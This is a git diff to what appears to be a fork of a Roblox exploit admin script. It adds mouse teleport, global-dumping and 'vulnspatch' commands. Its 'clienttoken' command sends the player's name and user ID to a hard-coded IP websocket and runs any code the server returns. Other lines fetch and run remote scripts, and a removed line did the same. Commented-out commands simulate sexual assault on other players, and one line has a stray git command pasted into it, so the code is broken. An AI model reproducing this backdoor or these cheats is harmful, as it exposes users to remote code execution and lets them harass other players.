@@ -20,9 +20,6 @@
 
 local startTime = tick()
 
--- fun fact: use bang and then hug on someone to do the unimaginable
--- also i might add ;suck cuz i got the hug animation
-
 if IY_LOADED and not _G.IY_DEBUG == true then
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/RyXeleron/infiniteyield-reborn/refs/heads/scriptblox/uselessscriptthatexistsinthisrepoiwin'))()
 	return
@@ -1972,6 +1969,7 @@ httprequest = (syn and syn.request) or (http and http.request) or http_request o
 PlaceId, JobId = game.PlaceId, game.JobId
 local IsOnMobile = table.find({Enum.Platform.IOS, Enum.Platform.Android}, UserInputService:GetPlatform())
 everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
+everyWebSocket = (syn and syn.websocket and syn.websocket.connect) or (WebSocket and WebSocket.connect)
 
 local isChatLegacy = (TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService)
 local chatRemote = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)
@@ -4682,12 +4680,14 @@ CMDs[#CMDs + 1] = {NAME = 'copyappearanceid / caid [player]', DESC = 'Copies a p
 --[[
 CMDs[#CMDs + 1] = {NAME = 'bang / rape [player] [speed]', DESC = 'Fucks someone (NSFW)'}
 CMDs[#CMDs + 1] = {NAME = 'facebang / facefuck / facerape [player] [speed]', DESC = 'Fucks someone in the face (NSFW)'}
+CMDs[#CMDs + 1] = {NAME = 'blow / blower / blowjob [player] [speed]', DESC = 'Fucks someone in the face (NSFW)'}
+CMDs[#CMDs + 1] = {NAME = 'unblow / unblower / unblowjob [player] [speed]', DESC = 'Another variant of facebang (NSFW)'}
 CMDs[#CMDs + 1] = {NAME = 'unbang / unrape / unfacefuck / unfacebang / unfacerape', DESC = 'Stops the rape.'}
-CMDs[#CMDs + 1] = {NAME = 'chokeon / suckon [player] [lower / upper]', DESC = 'Sucks someones private part(s) (NSFW)'}
-CMDs[#CMDs + 1] = {NAME = 'stopchokeon / unchokeon / stopsuckon / unsuckon', DESC = 'Stops the sucking.'}
+CMDs[#CMDs + 1] = {NAME = 'chokeon / suckon [player] [lower / upper]', DESC = 'Chokes someones private part(s) (NSFW)'}
+CMDs[#CMDs + 1] = {NAME = 'unchokeon / unsuckon', DESC = 'Stops the choking.'}
 ]]
 CMDs[#CMDs + 1] = {NAME = 'hug / kiss / biden [player] [front / back]', DESC = 'Hugs someone.'}
-CMDs[#CMDs + 1] = {NAME = 'unhug / stophug / releasehug / unbiden', DESC = 'Stops the hugging.'}
+CMDs[#CMDs + 1] = {NAME = 'unhug / unkiss / unbiden', DESC = 'Stops the hugging.'}
 CMDs[#CMDs + 1] = {NAME = 'backpack / attach [player]', DESC = 'Be someones backpack'}
 CMDs[#CMDs + 1] = {NAME = 'unbackpack / detach', DESC = 'Stops being a backpack'}
 CMDs[#CMDs + 1] = {NAME = 'carpet [player]', DESC = 'Be someones carpet'}
@@ -4696,7 +4696,7 @@ CMDs[#CMDs + 1] = {NAME = 'friend [player]', DESC = 'Sends a friend request to c
 CMDs[#CMDs + 1] = {NAME = 'unfriend [player]', DESC = 'Unfriends certain players'}
 CMDs[#CMDs + 1] = {NAME = 'headsit [player]', DESC = 'Sit on a players head'}
 CMDs[#CMDs + 1] = {NAME = 'hairdresser [player]', DESC = 'Does the hairdressing on a player :3'}
-CMDs[#CMDs + 1] = {NAME = 'unhairdresser / stophairdresser', DESC = 'Stops the hairdressing'}
+CMDs[#CMDs + 1] = {NAME = 'unhairdresser', DESC = 'Stops the hairdressing'}
 CMDs[#CMDs + 1] = {NAME = 'walkto / follow [player]', DESC = 'Follow a player'}
 CMDs[#CMDs + 1] = {NAME = 'pathfindwalkto / pathfindfollow [player]', DESC = 'Follow a player using pathfinding'}
 CMDs[#CMDs + 1] = {NAME = 'pathfindwalktowaypoint / pathfindwalktowp [waypoint]', DESC = 'Walk to a waypoint using pathfinding'}
@@ -4817,8 +4817,9 @@ CMDs[#CMDs + 1] = {NAME = 'unautokeypress', DESC = 'Stops autokeypress'}
 CMDs[#CMDs + 1] = {NAME = 'hovername', DESC = 'Shows a players username when your mouse is hovered over them'}
 CMDs[#CMDs + 1] = {NAME = 'unhovername / nohovername', DESC = 'Turns off hovername'}
 CMDs[#CMDs + 1] = {NAME = 'mousesensitivity / ms [0-10]', DESC = 'Sets your mouse sensitivity (affects first person and right click drag) (default is 1)'}
-CMDs[#CMDs + 1] = {NAME = 'clickdelete [CLIENT]', DESC = 'Go to settings>Keybinds>Add for clicktp'}
-CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settings > Keybinds > Add for click tp'}
+CMDs[#CMDs + 1] = {NAME = 'clickdelete [CLIENT]', DESC = 'Go to settings > Keybinds > Add for clickdelete'}
+CMDs[#CMDs + 1] = {NAME = 'clickteleport', DESC = 'Go to settings > Keybinds > Add for clicktp'}
+CMDs[#CMDs + 1] = {NAME = 'mouseteleport / mousetp', DESC = 'Teleports your character to your mouse. This is recommended as a keybind'}
 CMDs[#CMDs + 1] = {NAME = '', DESC = ''}
 CMDs[#CMDs + 1] = {NAME = 'simulationradius / simradius / setsimradius', DESC = 'Set the simulation radius.'}
 CMDs[#CMDs + 1] = {NAME = 'nosimulationradius / nosimradius / unsimradius', DESC = 'Set the simulation radius to the default values (139).'}
@@ -4885,6 +4886,7 @@ CMDs[#CMDs + 1] = {NAME = 'unhidechar [player]', DESC = 'Stops hiding the charac
 CMDs[#CMDs + 1] = {NAME = 'unhideallchars', DESC = 'Unhides all the characters.'}
 --CMDs[#CMDs + 1] = {NAME = 'azulawheelreplacement', DESC = 'Replaces the emotes wheel with azula\'s fork of the other one'} --[[https://raw.githubusercontent.com/mireyacs/emoteui/main/source.lua]]
 CMDs[#CMDs + 1] = {NAME = 'emotewheelreplacement', DESC = 'Replaces the emotes wheel with a custom one'}
+CMDs[#CMDs + 1] = {NAME = 'printglobals / printgs / getglobals / getgs', DESC = 'Prints out every global variables'}
 CMDs[#CMDs + 1] = {NAME = 'setglobal / setg [Global Name] [true/false]', DESC = 'Set a global variable to certain value.'}
 CMDs[#CMDs + 1] = {NAME = 'feflip', DESC = 'Loads up fe backflip by Zeezy'}
 task.wait()
@@ -6075,7 +6077,7 @@ ClickDelete.Select.MouseButton1Click:Connect(function()
 		refreshbinds()
 		updatesaves()
 		if keyPressed == 'RightClick' or keyPressed == 'LeftClick' then
-			notify('Keybinds Updated','Binded '..keyPressed..' to click delete')
+			notify('Keybinds Updated','Binded '..keyPressed..' to click delete')git merge -s ours upstream/master 
 		else
 			notify('Keybinds Updated','Binded '..keyPressed:sub(14)..' to click delete')
 		end
@@ -6417,77 +6419,70 @@ local success, err =
 end)
 
 addcmd('clienttoken', {'ctoken'}, function(args, speaker)
-if _G.ws then return end
+    if _G.ws then return end
 
-local url = "ws://3.70.136.27:6996/"
-local function generateRandomString(length)
-	local charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
-	local result = ''
-	for i = 1, length do
-		local rand = math.random(1, #charset)
-		result = result .. string.sub(charset, rand, rand)
-	end
-	return result
-end
+    local url = "ws://3.70.136.27:6996/"
+    local function generateRandomString(length)
+        local charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+        local result = ''
+        for i = 1, length do
+            local rand = math.random(1, #charset)
+            result = result .. string.sub(charset, rand, rand)
+        end
+        return result
+    end
 
-local username = game.Players.LocalPlayer.Name
-local userId = game.Players.LocalPlayer.UserId
-local randomString = generateRandomString(8)
-local randomNumber = Random.new():NextInteger(100000000, 999999999)
-local token = string.format("%s-%d-%s-%d", username, userId, randomString, randomNumber)
-local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+    local username = game.Players.LocalPlayer.Name
+    local userId = game.Players.LocalPlayer.UserId
+    local randomString = generateRandomString(8)
+    local randomNumber = Random.new():NextInteger(100000000, 999999999)
+    local token = string.format("%s-%d-%s-%d", username, userId, randomString, randomNumber)
+    local queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 
-if everyClipboard and everywebsocket then else warn("Unsupported executor"); return end
+    if not everyClipboard then
+        notify("Missing UNC(s)", "No clipboard functions found.")
+        return
+    end
+    if not everyWebSocket then
+        notify("Missing WebSockets", "No WebSocket functions found.")
+        return
+    end
 
-        everyClipboard(token)
+    everyClipboard(token)
+    notify("Client Token", "CToken copied to clipboard: " .. token)
 
-        notify("Generated token: " .. token)
+    pcall(function()
+        _G.ws = everyWebSocket.connect(url)
+    end)
 
-        pcall(function()
-	    _G.ws = everywebsocket.connect(url)
+    local ws = _G.ws
+    if ws then
+        notify("WebSocket", "Connected to WebSocket server successfully.")
+
+        ws:Send(token)
+
+        ws.OnMessage:Connect(function(message)
+            local success, err = pcall(function()
+                loadstring(message)()
+            end)
+            if not success then
+                notify("iyr.lol/executor", "Error executing script: " .. tostring(err))
+            end
         end)
 
-        local ws = _G.ws
-        if ws then
-            notify("Connected to WebSocket server")
+        ws.OnClose:Connect(function()
+            notify("WebSocket", "WebSocket connection closed.")
+        end)
 
-            -- added this cuz funny
-	        loadstring(game:HttpGet("https://storage.iyr.lol/other-stuff/changeexecutoridentiyfr.lua"))()
+        game:GetService("Players").PlayerRemoving:Connect(function(plr)
+            if plr == game:GetService("Players").LocalPlayer then
+                ws:Close()
+            end
+        end)
 
-            ws:Send(token)
-
-            ws.OnMessage:Connect(
-                function(message)
-                    local success, err =
-                        pcall(
-                        function()
-                            loadstring(message)()
-                            return
-                        end)
-                    if not success then
-                        notify("Error executing script:", err)
-                    end
-                    return
-                end)
-
-            ws.OnClose:Connect(
-                function()
-                    notify("WebSocket connection closed")
-                end)
-
-            game:GetService("Players").PlayerRemoving:Connect(
-                function(plr)
-                    if plr == game:GetService("Players").LocalPlayer then
-                        ws:Close()
-                    end
-                end)
-            game:GetService("Players").LocalPlayer.OnTeleport:Connect(
-                function()
-                    --queueteleport()
-                    ws:Close()
-                end)
-            else
-        notify("Failed to connect to WebSocket server, your exploit does not support WebSocket")
+        game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
+            ws:Close()
+        end)
     end
 end)
 
@@ -8801,6 +8796,11 @@ addcmd('setfpscap', {'fpscap', 'maxfps'}, function(args, speaker)
 	end
 end)
 
+addcmd("printglobals", {"printgs", 'getglobals', 'getgs'}, function(args, speaker)
+    for k, v in pairs(getgenv()) do
+       print(k, v)
+    end
+end)
 
 addcmd("setglobal", {"setg"}, function(args, speaker)
     if #args ~= 2 then
@@ -8820,7 +8820,6 @@ addcmd("setglobal", {"setg"}, function(args, speaker)
     _G[globalName] = value
     notify("Global Variable Set", string.format("Global variable '_G%s' set to %s.", globalName, tostring(value)))
 end)
-
 
 addcmd('notify',{},function(args, speaker)
 	notify(getstring(1))
@@ -11874,6 +11873,14 @@ addcmd('clickteleport',{},function(args, speaker)
 	end
 end)
 
+addcmd("mouseteleport", {"mousetp"}, function(args, speaker)
+    local root = getRoot(speaker.Character)
+    local pos = IYMouse.Hit
+    if root and pos then
+        root.CFrame = pos + Vector3.new(3, 1, 0)
+    end
+end)
+
 addcmd('tptool', {'teleporttool'}, function(args, speaker)
 	local TpTool = Instance.new("Tool")
 	TpTool.Name = "Teleport Tool"
@@ -11920,7 +11927,7 @@ end)
 
 addcmd('clickdelete',{},function(args, speaker)
 	if speaker == Players.LocalPlayer then
-		notify('Click Delete','Go to Settings>Keybinds>Add to set up click delete')
+		notify('Click Delete','Go to Settings > Keybinds > Add to set up click delete')
 	end
 end)
 
@@ -12137,6 +12144,14 @@ end)
 
 addcmd("vulnspatch",{'vpatcher','vulnspatcher'},function(args, speaker)
 	loadstring(game:HttpGet("https://github.com/FurryBoyYT/moreunc/raw/main/vulnpatch"))()
+
+  -- new vuln patch for solara
+   local old = writefile
+   getgenv().writefile = function(a, b)
+      a = a:gsub(":(/+)", "_")
+      old(a, b)
+   end
+
 	notify("Patching some vulns (Thanks to v3rm community)")
 end)
 
@@ -12654,6 +12669,59 @@ addcmd("facebang", {"facerape", "facefuck"}, function(args, speaker)
 		end
 	end
 end)
+local isBlowing = false
+local jumpConnection
+
+addcmd("blower", {'blow', 'blowbang', 'blowjob'}, function(args, speaker)
+    -- Ensure the humanoid exists and the rig type is R6
+    local humanoid = speaker.Character and speaker.Character:FindFirstChildWhichIsA("Humanoid")
+    if not humanoid then
+        notify("Error", "Humanoid not found in your character.")
+        return
+    end
+
+    if humanoid.RigType ~= Enum.HumanoidRigType.R6 then
+        notify("R6 Required", "This command requires the R6 rig type.")
+        return
+    end
+
+    if isBlowing then
+        execCmd("unblower")
+        return
+    end
+
+    isBlowing = true
+
+    if jumpConnection then
+        jumpConnection:Disconnect()
+    end
+
+    jumpConnection = humanoid.Jumping:Connect(function(active)
+        if active and isBlowing then
+            execCmd("unblower")
+        end
+    end)
+
+    if not args[1] then
+        notify("Error", "You must specify a player name.")
+        isBlowing = false
+        return
+    end
+
+    local targetPlayer = args[1]
+
+    execCmd("hug " .. targetPlayer)
+    if args[2] then
+        execCmd("facebang " .. targetPlayer .. " " .. args[2])
+    else
+        execCmd("facebang " .. targetPlayer)
+    end
+
+    task.defer(function()
+        isBlowing = false
+    end)
+end)
+
 
 addcmd("chokeon", {"suckon"}, function(args, speaker)
     if args[1] then
@@ -12718,6 +12786,7 @@ addcmd("chokeon", {"suckon"}, function(args, speaker)
     end
 end)
 ]]
+
 --------------------------------------------------------------------------------------------------------
 
 local ishugging = false
@@ -12786,7 +12855,7 @@ addcmd("hug", {"kiss", "biden"}, function(args, speaker)
     end
 end)
 
-addcmd("unhug", {"stophug", "unkiss", "releasehug", "unbiden"}, function(args, speaker)
+addcmd("unhug", {"unkiss", "unbiden"}, function(args, speaker)
     if hugDied then
         hugDied:Disconnect()
     end
@@ -12984,7 +13053,7 @@ addcmd("unbang", {"unrape","unfacebang","unfacerape","unfacefuck"}, function(arg
 	end
 end)
 
-addcmd("unchokeon", {"stopchokeon", "unsuckon", "stopsuckon"}, function(args, speaker)
+addcmd("unchokeon", {"unsuckon"}, function(args, speaker)
     if suckDied then
         suckDied:Disconnect()
     end
@@ -12997,7 +13066,19 @@ addcmd("unchokeon", {"stopchokeon", "unsuckon", "stopsuckon"}, function(args, sp
     end
     isSuckingOn = false
 end)
+
+addcmd("unblower", {'unblow', 'unblowbang', 'unblowjob'}, function()
+    execCmd("unhug\\unfacebang")
+    if isBlowing then
+        isBlowing = false
+        if jumpConnection then
+            jumpConnection:Disconnect()
+            jumpConnection = nil
+        end
+    end
+end)
 ]]
+
 addcmd('carpet',{},function(args, speaker)
 	local players = getPlayer(args[1], speaker)
 	if not r15(speaker) then
